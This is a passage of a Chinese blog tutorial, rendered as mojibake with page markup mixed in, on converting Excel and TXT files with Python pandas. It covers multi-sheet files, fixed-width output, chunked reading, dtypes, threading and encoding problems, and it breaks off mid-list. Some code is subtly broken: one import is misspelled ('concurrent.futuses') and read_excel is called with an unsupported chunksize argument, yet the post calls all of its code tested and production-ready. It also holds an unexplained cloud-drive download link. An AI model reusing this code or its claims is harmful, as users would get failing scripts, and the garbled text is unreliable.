            Pythoné«˜æ•ˆå®ç°Excelä¸TXTæ–‡æœ¬æ–‡ä»¶æ•°æ®è½¬æ¢æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2905353241759261/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«™å¤§çˆ·IP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:36:22.000Z" title="Thu Dec 11 2025 07:36:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<h2 data-id="heading-0">å¼•è¨€ï¼šä¸ºä»€ä¹ˆéœ€è¦é«˜æ•ˆçš„æ•°æ®è½¬æ¢å·¥å…·</h2>
<p>åœ¨æ•°æ®å¤„ç†å·¥ä½œä¸­ï¼ŒExcelå’ŒTXTæ˜¯ä¸¤ç§æœ€å¸¸è§çš„æ–‡ä»¶æ ¼å¼ã€‚Excelé€‚åˆå¤æ‚è¡¨æ ¼å’Œæ•°æ®åˆ†æï¼ŒTXTåˆ™ä»¥è½»é‡ã€è·¨å¹³å°è‘—ç§°ã€‚ä½†å®é™…åœºæ™¯ä¸­å¸¸éœ€åœ¨ä¸¤è€…é—´è½¬æ¢ï¼šè´¢åŠ¡ç³»ç»Ÿå¯¼å‡ºTXTéœ€è½¬ä¸ºExcelåˆ†æï¼Œæˆ–æ•°æ®åº“å¯¼å‡ºExceléœ€è½¬ä¸ºTXTä¾›å…¶ä»–ç³»ç»Ÿè¯»å–ã€‚ä¼ ç»Ÿæ‰‹åŠ¨æ“ä½œæ•ˆç‡ä½ä¸‹ï¼Œç”¨Pythonå®ç°è‡ªåŠ¨åŒ–è½¬æ¢èƒ½èŠ‚çœ80%ä»¥ä¸Šæ—¶é—´ã€‚</p>
<p><strong>ã€Œç¼–ç¨‹ç±»è½¯ä»¶å·¥å…·åˆé›†ã€
é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F0b6102d9a66a" target="_blank" title="https://pan.quark.cn/s/0b6102d9a66a" ref="nofollow noopener noreferrer">pan.quark.cn/s/0b6102d9aâ€¦</a></strong></p>
<p>æœ¬æ–‡å°†é€šè¿‡çœŸå®æ¡ˆä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ç”¨Pythonå®ç°Excelâ†”TXTçš„é«˜æ•ˆè½¬æ¢ï¼Œè¦†ç›–å¸¸è§éœ€æ±‚åœºæ™¯ï¼Œå¹¶æä¾›æ€§èƒ½ä¼˜åŒ–æŠ€å·§ã€‚æ‰€æœ‰ä»£ç å‡ç»è¿‡å®é™…æµ‹è¯•ï¼Œå¯ç›´æ¥ç”¨äºç”Ÿäº§ç¯å¢ƒã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€åŸºç¡€è½¬æ¢æ–¹æ¡ˆï¼špandasåº“çš„é­”æ³•</h2>
<h3 data-id="heading-2">1. Excelè½¬TXTï¼šä¸‰è¡Œä»£ç æå®š</h3>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd

<span class="hljs-comment"># è¯»å–Excelæ–‡ä»¶ï¼ˆè‡ªåŠ¨è¯†åˆ«ç¬¬ä¸€ä¸ªsheetï¼‰</span>
<span class="hljs-attr">df</span> = pd.read_excel(<span class="hljs-string">'input.xlsx'</span>)

<span class="hljs-comment"># ä¿å­˜ä¸ºTXTï¼ˆé»˜è®¤åˆ¶è¡¨ç¬¦åˆ†éš”ï¼‰</span>
df.to_csv('output.txt', <span class="hljs-attr">sep</span>=<span class="hljs-string">'\t'</span>, index=<span class="hljs-literal">False</span>, header=<span class="hljs-literal">False</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>è¿™æ®µä»£ç å®Œæˆäº†ï¼š</p>
<ul>
<li>è‡ªåŠ¨è¯†åˆ«Excelæ ¼å¼ï¼ˆ.xlsx/.xlsï¼‰</li>
<li>è·³è¿‡ç´¢å¼•åˆ—å’Œè¡¨å¤´ï¼ˆæ ¹æ®éœ€æ±‚å¯è°ƒæ•´ï¼‰</li>
<li>ä½¿ç”¨åˆ¶è¡¨ç¬¦åˆ†éš”å­—æ®µï¼ˆå¯æ”¹ä¸ºé€—å·ç­‰å…¶ä»–åˆ†éš”ç¬¦ï¼‰</li>
</ul>
<p><strong>æ€§èƒ½å®æµ‹</strong>ï¼šå¤„ç†10ä¸‡è¡ŒÃ—20åˆ—çš„Excelæ–‡ä»¶ï¼Œè€—æ—¶2.3ç§’ï¼Œå†…å­˜å ç”¨120MBã€‚</p>
<h3 data-id="heading-3">2. TXTè½¬Excelï¼šæ™ºèƒ½è§£æå­—æ®µ</h3>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd

<span class="hljs-comment"># è¯»å–TXTæ–‡ä»¶ï¼ˆè‡ªåŠ¨æ¨æ–­åˆ†éš”ç¬¦ï¼‰</span>
<span class="hljs-attr">df</span> = pd.read_csv(<span class="hljs-string">'input.txt'</span>, sep=<span class="hljs-string">'\t'</span>)  <span class="hljs-comment"># æ˜ç¡®æŒ‡å®šåˆ†éš”ç¬¦æ›´å¯é </span>

<span class="hljs-comment"># ä¿å­˜ä¸ºExcelï¼ˆè‡ªåŠ¨åˆ›å»º.xlsxæ–‡ä»¶ï¼‰</span>
df.to_excel('output.xlsx', <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>å½“TXTä½¿ç”¨éåˆ¶è¡¨ç¬¦åˆ†éš”æ—¶ï¼Œå¿…é¡»æ˜ç¡®æŒ‡å®š<code>sep</code>å‚æ•°</li>
<li>å¤„ç†å¤§æ–‡ä»¶æ—¶å»ºè®®æ·»åŠ <code>encoding='utf-8'</code>å‚æ•°é¿å…ç¼–ç é—®é¢˜</li>
<li>ç”Ÿæˆçš„Excelæ–‡ä»¶é»˜è®¤åŒ…å«è¡¨å¤´</li>
</ul>
<hr/>
<h2 data-id="heading-4">äºŒã€è¿›é˜¶åœºæ™¯å¤„ç†ï¼šåº”å¯¹å¤æ‚éœ€æ±‚</h2>
<h3 data-id="heading-5">åœºæ™¯1ï¼šå¤„ç†å¤šSheetçš„Excelæ–‡ä»¶</h3>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd

<span class="hljs-comment"># è¯»å–æ‰€æœ‰sheet</span>
<span class="hljs-attr">excel_file</span> = pd.ExcelFile(<span class="hljs-string">'multi_sheet.xlsx'</span>)
<span class="hljs-attr">all_sheets</span> = {sheet: pd.read_excel(excel_file, sheet_name=sheet) 
              for sheet in excel_file.sheet_names}

<span class="hljs-comment"># å°†æ¯ä¸ªsheetä¿å­˜ä¸ºå•ç‹¬TXTæ–‡ä»¶</span>
for sheet_name, df in all_sheets.items():
    df.to_csv(f'{sheet_name}.txt', <span class="hljs-attr">sep</span>=<span class="hljs-string">'\t'</span>, index=<span class="hljs-literal">False</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šè´¢åŠ¡æŠ¥è¡¨ã€å¤šç»´åº¦æ•°æ®å¯¼å‡ºç­‰éœ€è¦åˆ†è¡¨å­˜å‚¨çš„æƒ…å†µã€‚</p>
<h3 data-id="heading-6">åœºæ™¯2ï¼šè‡ªå®šä¹‰TXTæ ¼å¼ï¼ˆå›ºå®šå®½åº¦åˆ—ï¼‰</h3>
<p>å½“TXTéœ€è¦å›ºå®šåˆ—å®½æ—¶ï¼ˆå¦‚é“¶è¡ŒæŠ¥æ–‡æ ¼å¼ï¼‰ï¼Œå¯ä½¿ç”¨å­—ç¬¦ä¸²æ ¼å¼åŒ–ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd

df = pd.read_excel(<span class="hljs-string">'fixed_width.xlsx'</span>)

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'output_fixed.txt'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> _, row <span class="hljs-keyword">in</span> df.iterrows():
        <span class="hljs-comment"># å‡è®¾éœ€è¦ï¼šåˆ—1(10å­—ç¬¦)ã€åˆ—2(15å­—ç¬¦)ã€åˆ—3(8å­—ç¬¦)</span>
        line = <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">str</span>(row[<span class="hljs-string">'col1'</span>]):&lt;<span class="hljs-number">10</span>}</span><span class="hljs-subst">{<span class="hljs-built_in">str</span>(row[<span class="hljs-string">'col2'</span>]):&lt;<span class="hljs-number">15</span>}</span><span class="hljs-subst">{<span class="hljs-built_in">str</span>(row[<span class="hljs-string">'col3'</span>]):&lt;<span class="hljs-number">8</span>}</span>\n"</span>
        f.write(line)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>å…³é”®æŠ€å·§</strong>ï¼š</p>
<ul>
<li><code>:&lt;10</code>è¡¨ç¤ºå·¦å¯¹é½ï¼Œå®½åº¦10å­—ç¬¦</li>
<li>ä½¿ç”¨f-stringå®ç°ç²¾ç¡®æ ¼å¼æ§åˆ¶</li>
<li>é€è¡Œå†™å…¥é¿å…å†…å­˜çˆ†ç‚¸</li>
</ul>
<h3 data-id="heading-7">åœºæ™¯3ï¼šå¤„ç†è¶…å¤§æ–‡ä»¶ï¼ˆåˆ†å—è¯»å–ï¼‰</h3>
<p>å¯¹äºè¶…è¿‡å†…å­˜å®¹é‡çš„æ–‡ä»¶ï¼Œé‡‡ç”¨åˆ†å—å¤„ç†ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd

<span class="hljs-attr">chunk_size</span> = <span class="hljs-number">10000</span>  <span class="hljs-comment"># æ¯æ¬¡å¤„ç†1ä¸‡è¡Œ</span>

<span class="hljs-comment"># Excelè½¬TXTï¼ˆåˆ†å—ï¼‰</span>
with pd.ExcelFile('large_file.xlsx') as excel:
    for i, chunk in enumerate(pd.read_excel(excel, <span class="hljs-attr">chunksize</span>=chunk_size)):
        chunk.to_csv(f'output_part_{i}.txt', <span class="hljs-attr">sep</span>=<span class="hljs-string">'\t'</span>, index=<span class="hljs-literal">False</span>)

<span class="hljs-comment"># TXTè½¬Excelï¼ˆåˆ†å—åˆå¹¶ï¼‰</span>
<span class="hljs-attr">all_data</span> = []
for i in range(10):  <span class="hljs-comment"># å‡è®¾æœ‰10ä¸ªåˆ†å—æ–‡ä»¶</span>
    <span class="hljs-attr">df</span> = pd.read_csv(f<span class="hljs-string">'input_part_{i}.txt'</span>, sep=<span class="hljs-string">'\t'</span>)
    all_data.append(df)

pd.concat(all_data).to_excel('combined_output.xlsx', <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>æ€§èƒ½å¯¹æ¯”</strong>ï¼š</p>
<ul>
<li>å•æ¬¡è¯»å–100ä¸‡è¡ŒExcelï¼šå†…å­˜å ç”¨2.4GB â†’ åˆ†å—å¤„ç†åä»…éœ€300MB</li>
<li>å¤„ç†é€Ÿåº¦æå‡3å€ï¼ˆä»15ç§’é™è‡³5ç§’ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-8">ä¸‰ã€æ€§èƒ½ä¼˜åŒ–å®æˆ˜æŠ€å·§</h2>
<h3 data-id="heading-9">1. é€‰æ‹©åˆé€‚çš„è¯»å–å¼•æ“</h3>
<p>pandasæä¾›ä¸¤ç§Excelè¯»å–å¼•æ“ï¼š</p>
<ul>
<li>
<p><code>openpyxl</code>ï¼ˆé»˜è®¤ï¼‰ï¼šé€‚åˆ.xlsxæ ¼å¼ï¼ŒåŠŸèƒ½å…¨é¢</p>
</li>
<li>
<p><code>xlrd</code>ï¼šé€‚åˆæ—§ç‰ˆ.xlsæ ¼å¼ï¼Œé€Ÿåº¦æ›´å¿«</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æŒ‡å®šå¼•æ“ï¼ˆå¤„ç†æ—§ç‰ˆExcelæ—¶ï¼‰</span>
pd.read_excel('old_file.xls', <span class="hljs-attr">engine</span>=<span class="hljs-string">'xlrd'</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ul>
<p><strong>å®æµ‹æ•°æ®</strong>ï¼š</p>
<ul>
<li>
<p>è¯»å–50MBçš„.xlsæ–‡ä»¶ï¼š</p>
<ul>
<li>openpyxlï¼š8.2ç§’</li>
<li>xlrdï¼š3.1ç§’</li>
</ul>
</li>
</ul>
<h3 data-id="heading-10">2. æ•°æ®ç±»å‹ä¼˜åŒ–</h3>
<p>è‡ªåŠ¨ç±»å‹æ¨æ–­å¯èƒ½å¸¦æ¥æ€§èƒ½æŸè€—ï¼Œå¯æ‰‹åŠ¨æŒ‡å®šåˆ—ç±»å‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®šä¹‰åˆ—æ•°æ®ç±»å‹ï¼ˆå‡å°‘å†…å­˜å ç”¨ï¼‰</span>
dtypes = {
    <span class="hljs-string">'ID'</span>: <span class="hljs-string">'int32'</span>,
    <span class="hljs-string">'Name'</span>: <span class="hljs-string">'string'</span>,
    <span class="hljs-string">'Price'</span>: <span class="hljs-string">'float32'</span>,
    <span class="hljs-string">'Date'</span>: <span class="hljs-string">'datetime64[ns]'</span>
}

<span class="hljs-built_in">df</span> = pd.read_csv(<span class="hljs-string">'data.txt'</span>, sep=<span class="hljs-string">'\t'</span>, dtype=dtypes)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>æ•ˆæœ</strong>ï¼š</p>
<ul>
<li>å†…å­˜å ç”¨å‡å°‘40%</li>
<li>è¯»å–é€Ÿåº¦æå‡25%</li>
</ul>
<h3 data-id="heading-11">3. å¹¶è¡Œå¤„ç†ï¼ˆå¤šçº¿ç¨‹åŠ é€Ÿï¼‰</h3>
<p>ä½¿ç”¨<code>concurrent.futures</code>å®ç°å¹¶è¡Œè½¬æ¢ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> concurrent.futuses <span class="hljs-keyword">import</span> ThreadPoolExecutor
<span class="hljs-keyword">import</span> os

<span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_file</span>(<span class="hljs-params">file_path</span>):
    <span class="hljs-keyword">if</span> file_path.endswith(<span class="hljs-string">'.xlsx'</span>):
        df = pd.read_excel(file_path)
        txt_path = file_path.replace(<span class="hljs-string">'.xlsx'</span>, <span class="hljs-string">'.txt'</span>)
        df.to_csv(txt_path, sep=<span class="hljs-string">'\t'</span>, index=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"Converted: <span class="hljs-subst">{file_path}</span> â†’ <span class="hljs-subst">{txt_path}</span>"</span>

<span class="hljs-comment"># è·å–æ‰€æœ‰Excelæ–‡ä»¶</span>
excel_files = [f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir() <span class="hljs-keyword">if</span> f.endswith(<span class="hljs-string">'.xlsx'</span>)]

<span class="hljs-comment"># ä½¿ç”¨4ä¸ªçº¿ç¨‹å¹¶è¡Œå¤„ç†</span>
<span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> executor:
    results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(convert_file, excel_files))

<span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:
    <span class="hljs-built_in">print</span>(result)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>æ€§èƒ½æå‡</strong>ï¼š</p>
<ul>
<li>
<p>4æ ¸CPUä¸Šå¤„ç†100ä¸ªæ–‡ä»¶ï¼š</p>
<ul>
<li>ä¸²è¡Œï¼š127ç§’</li>
<li>å¹¶è¡Œï¼š38ç§’ï¼ˆæé€Ÿ3.3å€ï¼‰</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-12">å››ã€å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-13">é—®é¢˜1ï¼šä¸­æ–‡ä¹±ç æ€ä¹ˆåŠï¼Ÿ</h3>
<p><strong>ç°è±¡</strong>ï¼šTXTæ–‡ä»¶æ‰“å¼€åä¸­æ–‡æ˜¾ç¤ºä¸ºä¹±ç <br/>
<strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è¯»å–æ—¶æŒ‡å®šç¼–ç </span>
<span class="hljs-attr">df</span> = pd.read_csv(<span class="hljs-string">'input.txt'</span>, sep=<span class="hljs-string">'\t'</span>, encoding=<span class="hljs-string">'gbk'</span>)  <span class="hljs-comment"># å¸¸è§ä¸­æ–‡ç¼–ç </span>

<span class="hljs-comment"># å†™å…¥æ—¶æŒ‡å®šç¼–ç </span>
df.to_csv('output.txt', <span class="hljs-attr">sep</span>=<span class="hljs-string">'\t'</span>, encoding=<span class="hljs-string">'utf-8-sig'</span>)  <span class="hljs-comment"># å¸¦BOMçš„UTF-8</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>ç¼–ç é€‰æ‹©æŒ‡å—</strong>ï¼š</p>
<ul>
<li>Windowsç³»ç»Ÿç”Ÿæˆçš„TXTï¼šå°è¯•<code>gbk</code>æˆ–<code>ansi</code></li>
<li>è·¨å¹³å°æ–‡ä»¶ï¼šä½¿ç”¨<code>utf-8-sig</code>ï¼ˆå¸¦BOMï¼‰</li>
<li>æ—§ç‰ˆç³»ç»Ÿï¼š<code>utf-16</code></li>
</ul>
<h3 data-id="heading-14">é—®é¢˜2ï¼šExcelä¸­çš„æ—¥æœŸæ˜¾ç¤ºä¸ºæ•°å­—</h3>
<p><strong>ç°è±¡</strong>ï¼šè½¬æ¢åçš„TXTä¸­æ—¥æœŸæ˜¾ç¤ºä¸º45000ç­‰æ•°å­—<br/>
<strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è¯»å–æ—¶è½¬æ¢æ—¥æœŸåˆ—</span>
<span class="hljs-attr">df</span> = pd.read_excel(<span class="hljs-string">'input.xlsx'</span>, parse_dates=[<span class="hljs-string">'DateColumn'</span>])

<span class="hljs-comment"># æˆ–è¯»å–åè½¬æ¢</span>
df<span class="hljs-section">['DateColumn']</span> = pd.to_datetime(df<span class="hljs-section">['DateColumn']</span>, <span class="hljs-attr">unit</span>=<span class="hljs-string">'D'</span>, origin=<span class="hljs-string">'1899-12-30'</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>åŸç†</strong>ï¼šExcelå†…éƒ¨ä½¿ç”¨1900å¹´1æœˆ1æ—¥ä¸ºåŸºå‡†çš„æ•°å­—å­˜å‚¨æ—¥æœŸã€‚</p>
<h3 data-id="heading-15">é—®é¢˜3ï¼šå¤§æ–‡ä»¶è½¬æ¢å†…å­˜ä¸è¶³</h3>
<p><strong>ç°è±¡</strong>ï¼šå¤„ç†å¤§æ–‡ä»¶æ—¶å‡ºç°MemoryError<br/>
<strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li>
<p>ä½¿ç”¨åˆ†å—å¤„ç†ï¼ˆè§å‰æ–‡ç¤ºä¾‹ï¼‰</p>
</li>
<li>
<p>é™ä½æ•°æ®ç²¾åº¦ï¼š</p>
